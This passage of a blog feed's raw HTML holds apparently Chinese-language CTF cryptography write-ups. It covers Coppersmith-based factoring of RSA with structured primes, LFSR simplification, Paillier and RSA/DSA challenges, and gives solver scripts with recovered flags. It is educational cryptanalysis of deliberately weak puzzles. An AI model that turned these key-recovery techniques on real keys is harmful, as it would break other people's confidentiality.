class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coppersmith_univariate</span><span class="params">(f, n, beta, mm, tt, XX)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(f.is_monic() <span class="keyword">and</span> <span class="number">0</span> &lt; beta &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#epsilon = beta / 7</span></span><br><span class="line">    dd = f.degree() <span class="comment"># degree of polynomial</span></span><br><span class="line">    <span class="comment">#mm = ceil(beta**2 / (dd * epsilon)) # optimized param</span></span><br><span class="line">    <span class="comment">#tt = floor(dd * mm * (1 / beta - 1)) # optimized param</span></span><br><span class="line">    <span class="comment">#XX = ceil(n**(beta**2 / dd - epsilon)) # |x| &lt; XX</span></span><br><span class="line">    nn = mm * dd + tt</span><br><span class="line">    <span class="comment"># change ring of f and x to ZZ</span></span><br><span class="line">    fZ = f.change_ring(ZZ)</span><br><span class="line">    x = fZ.parent().gen()</span><br><span class="line">    <span class="comment"># instruct matrix</span></span><br><span class="line">    A_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(mm):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(dd):</span><br><span class="line">            A_list.append((XX * x)**j * n**(mm - i) * fZ(XX * x)**i)</span><br><span class="line">    A_list += [(XX * x)**i * fZ(XX * x)**mm <span class="keyword">for</span> i <span class="keyword">in</span> range(tt)]</span><br><span class="line">    A = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nn):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>):</span><br><span class="line">            A[i, j] = A_list[i][j]</span><br><span class="line">    <span class="comment"># LLL to solve SVP</span></span><br><span class="line">    AL = A.LLL(early_red=<span class="literal">True</span>, use_siegel=<span class="literal">True</span>)</span><br><span class="line">    f_smaller = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nn):</span><br><span class="line">        f_smaller += (AL[<span class="number">0</span>, i] * x**i) / (XX**i)</span><br><span class="line">    candidates = f_smaller.roots()</span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> root, _ <span class="keyword">in</span> candidates:</span><br><span class="line">        <span class="keyword">if</span> root.is_integer():</span><br><span class="line">            res = fZ(ZZ(root))</span><br><span class="line">            <span class="keyword">if</span> gcd(res, n) &gt;= n**beta: <span class="comment"># module's size satisfies</span></span><br><span class="line">                roots.append(ZZ(root))</span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">M_smaller, order = Gen_M_smaller(M, <span class="number">512</span> // <span class="number">4</span>)</span><br><span class="line">c = discrete_log(Mod(n, M_smaller), Mod(<span class="number">65537</span>, M_smaller))</span><br><span class="line"></span><br><span class="line">PR.&lt;k&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">'NTL'</span>)</span><br><span class="line">beta = <span class="number">0.48</span></span><br><span class="line">mm = <span class="number">5</span></span><br><span class="line">tt = <span class="number">6</span></span><br><span class="line">XX = int((<span class="number">2</span> * n**beta) / M_smaller)</span><br><span class="line"><span class="comment">#XX = ceil(n**(beta**2 - beta/7))</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> tqdm(range(c // <span class="number">2</span>, (c + order) // <span class="number">2</span>)):</span><br><span class="line">    f = k * M_smaller + Integer(pow(<span class="number">65537</span>, a, M_smaller))</span><br><span class="line">    roots = coppersmith_univariate(f.monic(), n, beta, mm, tt, XX)</span><br><span class="line">    <span class="keyword">if</span> len(roots):</span><br><span class="line">        print(roots[<span class="number">0</span>])</span><br><span class="line">        print(gcd(roots[<span class="number">0</span>] * M_smaller + Integer(pow(<span class="number">65537</span>, a, M_smaller)), n))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  0%|          | 5/600600 [00:00&lt;17:58:28,  9.28it/s]</span></span><br><span class="line"><span class="string">1426982562847111986146541</span></span><br><span class="line"><span class="string">3386619977051114637303328519173627165817832179845212640767197001941</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>coppersmith分解n成功，后续略</p><h4 id="more-1">[More]</h4><p>coppersmith求解的参数<span class="math inline">\((mm,tt)\)</span>在不同情况也要不用调参，后续我以一个有更小order的M'(17304344567133368654502628603056098610)进行了参数估计（利用已知满足coppersmith条件的f进行测试）</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_01-30-44.png"></p><p>基于复杂度考虑，选取<span class="math inline">\((mm,tt)=(10,11)\)</span>.</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_01-33-06.png"></p><p>但是可以看到这里在阶减小的同时，mm,tt也增大，意味着LLL的矩阵扩大，求解时间并没有太大的变化- -</p><p>这题的数据应该是出题人generate的一组较易求解的p，q（因为我们发现在爆破a的时候，其最差时间约18h，但a能在很小的时候即符合）</p><p>coppersmith这东西...调参就很玄（刚刚提到的<span class="math inline">\((mm,tt)=(10,11)\)</span>求解成功的f，在直接small_roots时即求解失败- -其实可以用来出题埋一手坑(x)）</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_01-45-05.png"></p><h3 id="unknown-name-crypto-challenge20200810">Unknown-name Crypto Challenge(2020/08/10)</h3><h4 id="题目考点-3">[题目考点]</h4><ul><li>化简能力- -||</li></ul><h4 id="题解分析-3">[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">"KEYIS&#123;xxxxxxxxxxxxxxxx&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">mask = int(os.urandom(<span class="number">4</span>).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">R = int(os.urandom(<span class="number">4</span>).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">iv = int(os.urandom(<span class="number">4</span>).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    R,m = lfsr(R,mask)</span><br><span class="line">    x = R ^ iv</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">    x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">    x = x &amp; <span class="number">255</span></span><br><span class="line">    enc += chr(ord(i)^x)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-08-10_23-38-54.png"></p><ol type="1"><li><p>由于iv是fixed的，所以可以简化为8bits的new_iv，在最后异或即可</p></li><li><p>R, _ = lfsr(R, mask)，因此也可简化为8bits的new_R, _ = new_lfsr(new_R)</p><p>注：这里的new_lfsr实际上已非lfsr，但仍保持如下性质</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-08-10_23-54-47.png"></p><p>即经new_LFSR后，<code>new_R = ((new_R &lt;&lt; 1) &amp; 0xff) | random_bit</code></p></li></ol><p>因此可将上述化简为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new_R = new_lfsr(new_R)</span><br><span class="line">x = new_R ^ new_iv</span><br><span class="line">enc += chr(ord(i) ^ x)</span><br></pre></td></tr></table></figure><p>故对<strong>密钥流</strong>有以下递推关系：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">prev = R ^ new_iv</span><br><span class="line">curr = (((R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xff</span>) | random_bit) ^ new_iv</span><br><span class="line">(prev &amp; <span class="number">0x7f</span>) = (R &amp; <span class="number">0x7f</span>) ^ (new_iv &amp; <span class="number">0x7f</span>)</span><br><span class="line">(curr &gt;&gt; <span class="number">1</span>) = (R &amp; <span class="number">0x7f</span>) ^ (new_iv &gt;&gt; <span class="number">1</span>)</span><br><span class="line">(prev &amp; <span class="number">0x7f</span>) ^ (curr &gt;&gt; <span class="number">1</span>) = (new_iv &amp; <span class="number">0x7f</span>) ^ (new_iv &gt;&gt; <span class="number">1</span>) <span class="comment"># new_iv -&gt; constant</span></span><br></pre></td></tr></table></figure><p>但curr的最低比特未知，flag内芯为小写md5，因此递归作判断即可</p><h4 id="exp-2">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">flag_charset = <span class="string">b"0123456789abcdef"</span></span><br><span class="line">cipher = unhexlify(<span class="string">b"3bcd21d009a7e0ad9fa6718cd6310ed06a13bd589e0963"</span>)</span><br><span class="line">prefix = <span class="string">b"S&#123;"</span></span><br><span class="line">suffix = <span class="string">b"&#125;"</span></span><br><span class="line">constant = ((prefix[<span class="number">0</span>] ^ cipher[<span class="number">4</span>]) &amp; <span class="number">0x7f</span>) ^ ((prefix[<span class="number">1</span>] ^ cipher[<span class="number">5</span>]) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">pre = prefix[<span class="number">1</span>] ^ cipher[<span class="number">5</span>]</span><br><span class="line">flag = <span class="string">"KEYIS&#123;"</span></span><br><span class="line">cipher = cipher[<span class="number">6</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">(flag, pre, constant, i)</span>:</span></span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    cur = ((pre &amp; <span class="number">0x7f</span>) ^ constant) &lt;&lt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">16</span> <span class="keyword">and</span> chr((cur + <span class="number">1</span>) ^ cipher[i]) == <span class="string">'&#125;'</span> <span class="keyword">or</span> chr(cur ^ cipher[i]) == <span class="string">'&#125;'</span>:</span><br><span class="line">        print(flag + <span class="string">'&#125;'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> (cur ^ cipher[i]) <span class="keyword">in</span> flag_charset:</span><br><span class="line">            getflag(flag + chr(cur ^ cipher[i]), cur, constant, i + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> ((cur + <span class="number">1</span>) ^ cipher[i]) <span class="keyword">in</span> flag_charset:</span><br><span class="line">            getflag(flag + chr((cur + <span class="number">1</span>) ^ cipher[i]), cur + <span class="number">1</span>, constant, i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">getflag(flag, pre, constant, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># KEYIS&#123;1fa32bc3ccee9872&#125;</span></span><br></pre></td></tr></table></figure><h4 id="more-2">[More]</h4><p>并不知道是什么赛事的题目- -好多师傅都在问，出题思路和X-MAS CTF基本相同，主要考察点即为化简</p><p><a href="https://github.com/pberba/ctf-solutions/blob/8eb87af5bb2fbf7af683c7fd79d7979f032b7ae9/20181223_xmasctf/crypto-460-probably_really_nice_goodies/README.md" target="_blank" rel="noopener">https://github.com/pberba/ctf-solutions/blob/8eb87af5bb2fbf7af683c7fd79d7979f032b7ae9/20181223_xmasctf/crypto-460-probably_really_nice_goodies/README.md</a></p><h3 id="ciscn2018---sm">CISCN2018 - sm</h3><h4 id="题目文件-2">[题目文件]</h4><p><a href="sm.zip">Click Here to Download</a></p><h4 id="题解分析-4">[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen512num</span><span class="params">()</span>:</span></span><br><span class="line">    order = shuffle(list(range(<span class="number">1</span>, <span class="number">513</span>)))</span><br><span class="line">    ps = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">        p = getPrime(<span class="number">512</span> - order[i] + <span class="number">10</span>)</span><br><span class="line">        pre = bin(p)[<span class="number">2</span>:][<span class="number">0</span>:(<span class="number">512</span>-order[i])] + <span class="string">"1"</span></span><br><span class="line">        ps.append(int(pre + <span class="string">"0"</span> * (<span class="number">512</span> - len(pre)), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> ps</span><br></pre></td></tr></table></figure><p>可以看到<code>gen512num</code>返回的ps数组中，均为512bits的随机数，但存在下列关系：</p><p>for <span class="math inline">\(p\in ps\)</span>，bin(p)[2:]的suffix均满足'1'+i*'0' <span class="math inline">\((i\in [0,511])\)</span>，且i互不重复</p><p>choose为长度512的01向量，按如下规则leak出信息r</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">    <span class="keyword">if</span> bchoose[i]==<span class="string">'1'</span>:</span><br><span class="line">        r = r ^ ps[i]</span><br></pre></td></tr></table></figure><p>且题目给出ps，又有上述ps特性，即可从r末位比特向前恢复出choose</p><h4 id="exp-3">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="number">6753785483255906709117615805253027649453460653974415214642466102672301763943358839905575042938258141827000621474498066533397472809407687579125519939754658</span></span><br><span class="line">ps = []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"ps"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        ps.append(int(line[:<span class="number">-1</span>]))</span><br><span class="line">ps_dict = dict() <span class="comment"># ps_dict[i]'s suffix satisfies '1' + i * '0'</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ps:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">2</span>**i) &amp; p) != <span class="number">0</span>:</span><br><span class="line">            ps_dict[i] = p</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">choose = [<span class="number">0</span>] * <span class="number">512</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">    <span class="keyword">if</span> ((<span class="number">2</span>**i) &amp; r) != <span class="number">0</span>:</span><br><span class="line">        r ^= ps_dict[i]</span><br><span class="line">        choose[ps.index(ps_dict[i])] = <span class="number">1</span></span><br><span class="line">choose = int(<span class="string">''</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> choose), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">key = long_to_bytes(int(md5(long_to_bytes(choose)).hexdigest(), <span class="number">16</span>))</span><br><span class="line">aes_obj = AES.new(key, AES.MODE_ECB)</span><br><span class="line">cipher = b64decode(<span class="string">b"5eFo3ANg2fu9LRrFktWCJmVvx6RgBFzd0R8GXQ8JD78="</span>)</span><br><span class="line">flag = aes_obj.decrypt(cipher)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'flag&#123;shemir_alotof_in_wctf_fun!&#125;'</span></span><br></pre></td></tr></table></figure><h4 id="more-3">[More]</h4><p>临近2020国赛了 :(</p><p>赛前找了些往年的cry题看了看- -难度上几乎比不上其他国际赛，但是有些风格奇奇怪怪</p><p>Training系列的博文就以一篇5题为规范吧，希望国赛人没事</p><p><strong>END</strong></p>]]></content>
      
      
      <categories>
          
          <category> Training </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(DASCTF四月春季赛) - Crypto</title>
      <link href="/2020/04/25/WriteUp-DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9B-Crypto/"/>
      <url>/2020/04/25/WriteUp-DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9B-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="not_rsa">not_RSA</h3><h4 id="题目考点">[题目考点]</h4><ul><li>Paillier cryptosystem</li></ul><h4 id="题目文件">[题目文件]</h4><p><a href="2004225e9ff0cc3c4c4.py">Click Here to Download</a></p><h4 id="题解分析">[题解分析]</h4><p>从<span class="math inline">\(Z_{n}\times Z_{n}^{*}\)</span>到<span class="math inline">\(Z_{n^{2}}^{*}\)</span>存在双射关系<span class="math inline">\((x,y)\rightarrow g^{x}y^{n}(mod\ n^{2})\)</span></p><p>Paillier cryptosystem系统加解密流程如下：</p><p><img src= "/img/loading.gif" data-src="/2020/04/25/WriteUp-DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9B-Crypto/Snipaste_2020-04-25_23-32-48.png"></p><p>which <span class="math inline">\(\lambda =lcm(p-1,q-1),L(u)=\frac{u-1}{n}\)</span></p><p><strong>Proof：</strong></p><p><span class="math inline">\(g\in Z_{n^{2}}^{*},\quad\therefore \exists(a, b),s.t.\ g=(n+1)^{a}b^{n}(mod\ n^{2})\)</span></p><p><span class="math inline">\(c^{\lambda}=(n+1)^{am\lambda}b^{nm\lambda}r^{n\lambda}=(n+1)^{am\lambda}=1+am\lambda n(mod\ n^{2})\)</span></p><p><span class="math inline">\(L(c^{\lambda}\ mod\ n^{2})=am\lambda\)</span>，同理<span class="math inline">\(L(g^{\lambda}\ mod\ n^{2})=a\lambda\)</span>，证毕</p><p>本题<span class="math inline">\(g=n+1\)</span>，且n可以直接Fermat分解得到pq，按上述方法解密即可</p><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span></span><br><span class="line">q = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="number">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line">lcm = ((p - <span class="number">1</span>) * (q - <span class="number">1</span>)) // GCD(p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">a = (pow(c, lcm, n * n) - <span class="number">1</span>) // n</span><br><span class="line">b = (pow(n + <span class="number">1</span>, lcm, n * n) - <span class="number">1</span>) // n</span><br><span class="line">m = long_to_bytes((a * inverse(b, n)) % n)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h4 id="more">[More]</h4><p>单从这道题本身来看，其实不了解这个密码系统也可，因为<span class="math inline">\(g=n+1\)</span>，且<span class="math inline">\(r^{n\cdot lcm(p-1)(q-1)}\equiv 1(mod\ n^{2})\)</span>，所以<span class="math inline">\(c^{lcm}\rightarrow\)</span> 二项式定理即可得<span class="math inline">\(m\cdot lcm(mod\ n)\)</span></p><h3 id="complex-encode">Complex Encode</h3><h4 id="题目考点-1">[题目考点]</h4><ul><li>有限域开根</li><li>其他RSA/DSA基础知识</li></ul><h4 id="题目文件-1">[题目文件]</h4><p><a href="2004225e9ff0cc9e73b.zip">Click Here to Download</a></p><h4 id="题解分析-1">[题解分析]</h4><p>套娃题- -流程捋顺也就出来了</p><p>Step 1：RSA加密，且<span class="math inline">\(GCD(phi_{1},e_{1})=random.randint(3, 12)\)</span>，<span class="math inline">\(p_{1}\)</span>作为泄露信息进入Step2</p><p>Step 2：<span class="math inline">\(p_{1}\)</span>作为DSA Signature的私钥，对rsaEncode2(false_flag)签名，并返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sig = r.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>) + s.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>) + k.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>)+ q.to_bytes(<span class="number">205</span>, <span class="string">'big'</span>)</span><br><span class="line">f.write(<span class="string">"dsaEncode :"</span>+base64.b64encode(sig).decode()+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>Step 3：Step 2中的rsaEncode2(false_flag)来自于第二个RSA加密系统的返回值，可以看到gen_prime时用了next_prime，费马分解得到<span class="math inline">\(p_{2},q_{2}\)</span>，且发现<span class="math inline">\(GCD(e_{2},phi_{2})=41\)</span>，因此先得到了<span class="math inline">\(m_{2}^{41}(mod\ n_{2})\)</span>，<span class="math inline">\(F_{p_{2}},F_{q_{2}}\)</span>上对<span class="math inline">\(c_{2}\)</span>开41次根，并对所有组合crt即可还原<span class="math inline">\(m_{2}\)</span>（<code>b'flag{T0o_YoUn9_to0_4imP1e}'</code>），但无意义，该rsa系统返回值为<span class="math inline">\(m_{2}^{41}(mod\ n_{2})\)</span>，fine</p><p>Step 2中(r, s, k, q, m)均已知，可直接求出私钥x，也即为<span class="math inline">\(p_{1}\)</span></p><p>再对第一个RSA系统常规解密得到<span class="math inline">\(m_{1}^{5}\)</span>，最后有限域开根crt拿到flag</p><h4 id="exp-1">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第二个RSA解密略</span></span><br><span class="line">m2 = bytes_to_long(<span class="string">b'flag&#123;T0o_YoUn9_to0_4imP1e&#125;'</span>)</span><br><span class="line">ran2 = <span class="number">41</span></span><br><span class="line">rsaEnc2 = pow(m2, ran2, n2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">sig = <span class="string">b'...'</span></span><br><span class="line">sig = b64decode(sig)</span><br><span class="line">r = bytes_to_long(sig[:<span class="number">205</span>])</span><br><span class="line">s = bytes_to_long(sig[<span class="number">205</span>:<span class="number">410</span>])</span><br><span class="line">k = bytes_to_long(sig[<span class="number">410</span>:<span class="number">615</span>])</span><br><span class="line">q = bytes_to_long(sig[<span class="number">615</span>:<span class="number">820</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">Hm = int.from_bytes(hashlib.md5(str(rsaEnc2).encode(<span class="string">'utf-8'</span>)).hexdigest().encode(), <span class="string">'big'</span>)</span><br><span class="line">x = ((s * k - Hm) % q) * inverse(r, q)</span><br><span class="line">n1 = ...</span><br><span class="line">p1 = x % q</span><br><span class="line">q1 = n1 // p1</span><br><span class="line">e1 = <span class="number">0x12a316381</span></span><br><span class="line">c1 = ...</span><br><span class="line"><span class="keyword">assert</span>(GCD(e1, (p1 - <span class="number">1</span>)*(q1 - <span class="number">1</span>)) == <span class="number">5</span>)</span><br><span class="line">d1 = inverse(e1 // <span class="number">5</span>, (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>))</span><br><span class="line">m1_5 = pow(c1, d1, n1)</span><br><span class="line"></span><br><span class="line">PP.&lt;x&gt; = PolynomialRing(Zmod(p1))</span><br><span class="line">fp = x^<span class="number">5</span> - (m1_5 % p1)</span><br><span class="line">m1_p = fp.roots()</span><br><span class="line">PQ.&lt;y&gt; = PolynomialRing(Zmod(q1))</span><br><span class="line">fq = y^<span class="number">5</span> - (m1_5 % q1)</span><br><span class="line">m1_q = fq.roots()</span><br><span class="line"></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m1_p:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> m1_q:</span><br><span class="line">        tmp.append((i[<span class="number">0</span>], j[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (m1p, m1q) <span class="keyword">in</span> tmp:</span><br><span class="line">    print(long_to_bytes(crt([int(m1p), int(m1q)], [int(p1), int(q1)])))</span><br><span class="line"><span class="comment"># 